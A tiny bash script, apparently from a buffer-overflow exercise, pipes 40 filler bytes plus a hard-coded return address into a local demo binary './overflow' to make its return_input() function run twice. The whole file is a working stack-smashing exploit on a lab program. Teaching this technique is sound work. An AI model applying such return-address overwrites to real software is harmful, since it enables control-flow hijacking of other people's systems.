#!/bin/bash

# \x6f\x05\x40\x00 - is 0x0040056f - the address of the function return_input()
# this hack overflows stack and runs return_input() twice

printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDD\x6f\x05\x40\x00" | ./overflow
